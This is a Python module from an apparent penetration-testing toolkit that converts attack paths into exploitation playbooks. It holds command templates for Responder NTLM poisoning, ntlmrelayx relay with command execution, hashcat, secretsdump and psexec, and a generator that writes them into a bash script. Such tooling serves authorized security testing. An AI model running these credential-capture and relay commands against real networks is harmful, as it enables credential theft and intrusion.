"""
Scanner Synchronization and Tactical Orchestration Module
Analyzes multi-source attack paths and suggests actionable next steps.
Integrates with external tools (Responder, hashcat, ntlmrelayx) for active exploitation.
"""
import logging
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum

from ..core.reasoning_engine_v2 import AttackPath
from ..core.data_models import SeverityLevel, AtomicFinding

logger = logging.getLogger(__name__)


class BlockerType(Enum):
    """Types of blockers preventing exploitation."""
    MISSING_CREDENTIAL = "missing_credential"
    FIREWALL_RULE = "firewall_rule"
    MISSING_INFO = "missing_info"
    INVALID_STATE = "invalid_state"


@dataclass
class PathBlocker:
    """Represents an obstacle in attack path."""
    blocker_type: BlockerType
    description: str
    node: str  # Node where blocker occurs
    severity: SeverityLevel = SeverityLevel.MEDIUM
    resolution_options: List[str] = field(default_factory=list)


@dataclass
class TacticalAction:
    """Represents an actionable security test step."""
    action_id: str
    priority: int  # 1-10, 1 is highest
    category: str  # 'credential_capture', 'lateral_movement', 'privilege_escalation'
    command: str  # Actual shell command to execute
    description: str
    expected_result: str
    risk_level: SeverityLevel = SeverityLevel.MEDIUM
    blockers_resolved: List[str] = field(default_factory=list)


class ActiveNextSteps:
    """
    Analyzes attack paths to identify active exploitation steps.
    Generates actionable commands for security testing tools.
    """

    # Tool command templates
    TOOL_TEMPLATES = {
        'responder': 'responder -I {interface} -rPv',
        'responder_listen': 'responder -I {interface} --lm -rPv',
        'ntlmrelayx': 'ntlmrelayx.py -t {target_ip} -c "whoami"',
        'hashcat': 'hashcat -m {hash_type} {hash_file} {wordlist}',
        'impacket_secretsdump': 'secretsdump.py {domain}/{username}:{password}@{target_ip}',
        'impacket_psexec': 'psexec.py {domain}/{username}:{password}@{target_ip}',
        'smbmap': 'smbmap -H {target_ip} -u {username} -p {password}',
        'enum4linux': 'enum4linux -a -u {username} -p {password} {target_ip}',
    }

    def __init__(self):
        """Initialize tactical orchestration engine."""
        self.logger = logging.getLogger(self.__class__.__name__)
        self.blockers: List[PathBlocker] = []
        self.tactical_actions: List[TacticalAction] = []

    def analyze_paths(self, attack_paths: List[AttackPath]) -> List[TacticalAction]:
        """
        Analyze attack paths and generate tactical actions.
        
        Args:
            attack_paths: List of attack paths to analyze
        
        Returns:
            Sorted list of tactical actions
        """
        self.logger.info(f"Analyzing {len(attack_paths)} attack paths for tactical actions")
        
        all_actions = []
        
        for path in attack_paths:
            # Analyze each path for blockers and opportunities
            path_actions = self._analyze_path(path)
            all_actions.extend(path_actions)
        
        # Sort by priority
        all_actions.sort(key=lambda x: x.priority)
        
        self.tactical_actions = all_actions
        return all_actions

    def _analyze_path(self, path: AttackPath) -> List[TacticalAction]:
        """Analyze single path for blockers and actions."""
        actions = []
        blockers = []
        
        # Analyze each edge in the path
        for i, edge in enumerate(path.edges):
            # Check for missing credentials
            if edge.edge_type == "authenticated_access":
                if not edge.metadata.get('credential_available'):
                    blocker = PathBlocker(
                        blocker_type=BlockerType.MISSING_CREDENTIAL,
                        description=f"Credential needed for {edge.target}",
                        node=edge.target,
                        severity=SeverityLevel.HIGH
                    )
                    blockers.append(blocker)
                    
                    # Suggest credential capture
                    actions.extend(
                        self._generate_credential_actions(edge.target, path)
                    )
            
            # Check for web vulnerabilities
            elif edge.edge_type in ['idor', 'sqli', 'auth_bypass', 'xxe', 'ssrf']:
                action = TacticalAction(
                    action_id=f"exploit_{edge.edge_type}_{edge.target}",
                    priority=5,
                    category="web_exploitation",
                    command=f"# Exploit {edge.edge_type} on {edge.target}",
                    description=f"Exploit {edge.edge_type} vulnerability on {edge.target}",
                    expected_result="Access to endpoint granted or data extracted"
                )
                actions.append(action)
            
            # Check for credential/token extraction
            elif edge.edge_type == "credential_match":
                action = TacticalAction(
                    action_id=f"use_credential_{edge.source}",
                    priority=2,
                    category="credential_utilization",
                    command=f"# Use credential from {edge.source} for {edge.target}",
                    description=f"Utilize extracted credential from traffic",
                    expected_result="Authenticated access established"
                )
                actions.append(action)
        
        self.blockers.extend(blockers)
        return actions

    def _generate_credential_actions(
        self,
        target_node: str,
        path: AttackPath
    ) -> List[TacticalAction]:
        """Generate actions to capture missing credentials."""
        actions = []
        
        # Check if target IP is active in captured traffic
        # This would be indicated in path metadata
        if "network" in path.layers:
            # Generate Responder/ntlmrelayx commands
            action = TacticalAction(
                action_id=f"responder_{target_node}",
                priority=3,
                category="credential_capture",
                command=self.TOOL_TEMPLATES['responder'].format(interface='eth0'),
                description=f"Capture NTLM credentials via Responder on {target_node}",
                expected_result="NTLM hash captured from {target_node}",
                risk_level=SeverityLevel.MEDIUM
            )
            actions.append(action)
            
            # Generate ntlmrelayx command
            relay_action = TacticalAction(
                action_id=f"ntlmrelayx_{target_node}",
                priority=4,
                category="credential_relay",
                command=self.TOOL_TEMPLATES['ntlmrelayx'].format(
                    target_ip=target_node
                ),
                description=f"Relay captured NTLM to {target_node}",
                expected_result="Command execution as authenticated user",
                risk_level=SeverityLevel.HIGH
            )
            actions.append(relay_action)
        
        return actions

    def generate_playbook(
        self,
        attack_paths: List[AttackPath],
        output_format: str = 'text'
    ) -> str:
        """
        Generate exploitation playbook from attack paths.
        
        Args:
            attack_paths: Paths to operationalize
            output_format: 'text', 'json', or 'bash'
        
        Returns:
            Formatted playbook
        """
        # First analyze paths
        tactics = self.analyze_paths(attack_paths)
        
        if output_format == 'bash':
            return self._generate_bash_playbook(tactics)
        elif output_format == 'json':
            return self._generate_json_playbook(tactics)
        else:
            return self._generate_text_playbook(tactics)

    def _generate_text_playbook(self, tactics: List[TacticalAction]) -> str:
        """Generate human-readable playbook."""
        playbook = "=" * 80 + "\n"
        playbook += "🎯 ACTIVE EXPLOITATION PLAYBOOK\n"
        playbook += "=" * 80 + "\n\n"
        
        for i, action in enumerate(tactics, 1):
            playbook += f"STEP {i}: {action.description}\n"
            playbook += f"  Priority: {action.priority}/10\n"
            playbook += f"  Category: {action.category}\n"
            playbook += f"  Risk: {action.risk_level}\n"
            playbook += f"\n  Command:\n"
            playbook += f"    $ {action.command}\n"
            playbook += f"\n  Expected Result:\n"
            playbook += f"    {action.expected_result}\n"
            if action.blockers_resolved:
                playbook += f"\n  Resolves Blockers:\n"
                for blocker in action.blockers_resolved:
                    playbook += f"    - {blocker}\n"
            playbook += "\n" + "-" * 80 + "\n\n"
        
        return playbook

    def _generate_bash_playbook(self, tactics: List[TacticalAction]) -> str:
        """Generate bash script playbook."""
        script = "#!/bin/bash\n"
        script += "# Auto-generated exploitation playbook\n"
        script += "# Use with caution - verify commands before execution\n\n"
        
        for action in tactics:
            script += f"# {action.description}\n"
            script += f"echo '[*] Executing: {action.description}'\n"
            script += f"{action.command}\n"
            script += f"sleep 2\n\n"
        
        return script

    def _generate_json_playbook(self, tactics: List[TacticalAction]) -> str:
        """Generate JSON playbook."""
        import json
        
        playbook_data = {
            'playbook_version': '1.0',
            'total_steps': len(tactics),
            'steps': [
                {
                    'step': i,
                    'action_id': action.action_id,
                    'priority': action.priority,
                    'category': action.category,
                    'description': action.description,
                    'command': action.command,
                    'expected_result': action.expected_result,
                    'risk_level': action.risk_level.name,
                    'blockers_resolved': action.blockers_resolved
                }
                for i, action in enumerate(self.tactical_actions, 1)
            ]
        }
        
        return json.dumps(playbook_data, indent=2)

    def get_blockers_summary(self) -> str:
        """Get summary of blockers and resolution options."""
        summary = "ATTACK PATH BLOCKERS\n"
        summary += "=" * 60 + "\n\n"
        
        for blocker in self.blockers:
            summary += f"⛔ {blocker.blocker_type.value.upper()}\n"
            summary += f"   Location: {blocker.node}\n"
            summary += f"   Issue: {blocker.description}\n"
            summary += f"   Severity: {blocker.severity}\n"
            
            if blocker.resolution_options:
                summary += f"   Resolution Options:\n"
                for i, option in enumerate(blocker.resolution_options, 1):
                    summary += f"     {i}. {option}\n"
            
            summary += "\n"
        
        return summary

    def prioritize_actions(self) -> List[TacticalAction]:
        """Get actions sorted by priority."""
        return sorted(self.tactical_actions, key=lambda x: x.priority)

    def get_quick_wins(self) -> List[TacticalAction]:
        """Get low-effort, high-impact actions."""
        return [
            a for a in self.tactical_actions
            if a.priority <= 3 and a.risk_level != SeverityLevel.CRITICAL
        ]

    def get_high_risk_actions(self) -> List[TacticalAction]:
        """Get high-risk actions requiring careful consideration."""
        return [
            a for a in self.tactical_actions
            if a.risk_level == SeverityLevel.CRITICAL
        ]

    def get_actions_by_category(self, category: str) -> List[TacticalAction]:
        """Get actions by category."""
        return [
            a for a in self.tactical_actions
            if a.category == category
        ]

    def estimate_time_to_compromise(self) -> Tuple[int, str]:
        """
        Estimate time needed to compromise target based on path complexity.
        
        Returns:
            Tuple of (estimated_minutes, complexity_description)
        """
        if not self.tactical_actions:
            return 0, "No actionable paths"
        
        # Quick estimate: 5-10 minutes per major layer
        # Plus 10 minutes per blocker
        time_estimate = 15  # Base time
        time_estimate += len(self.tactical_actions) * 5
        time_estimate += len(self.blockers) * 10
        
        if time_estimate <= 30:
            complexity = "Simple (< 30 min)"
        elif time_estimate <= 120:
            complexity = "Moderate (30 min - 2 hours)"
        else:
            complexity = "Complex (> 2 hours)"
        
        return time_estimate, complexity

    def get_recommendations(self) -> List[str]:
        """Get security recommendations based on identified paths."""
        recommendations = []
        
        # Check for weak credential security
        if any(a.category == 'credential_capture' for a in self.tactical_actions):
            recommendations.append(
                "🔐 Implement network segmentation to prevent credential capture"
            )
            recommendations.append(
                "🔐 Enforce multi-factor authentication on all high-value accounts"
            )
        
        # Check for web vulnerabilities
        if any(a.category == 'web_exploitation' for a in self.tactical_actions):
            recommendations.append(
                "🌐 Perform comprehensive web application security testing"
            )
            recommendations.append(
                "🌐 Implement Web Application Firewall (WAF) rules"
            )
        
        # Check for lateral movement
        if any(a.category == 'lateral_movement' for a in self.tactical_actions):
            recommendations.append(
                "🔀 Restrict lateral movement with network micro-segmentation"
            )
            recommendations.append(
                "🔀 Monitor and alert on suspicious inter-host communication"
            )
        
        # Check for privilege escalation
        if any(a.category == 'privilege_escalation' for a in self.tactical_actions):
            recommendations.append(
                "👑 Implement Privileged Access Management (PAM) solution"
            )
            recommendations.append(
                "👑 Monitor and audit all privilege escalation events"
            )
        
        return recommendations
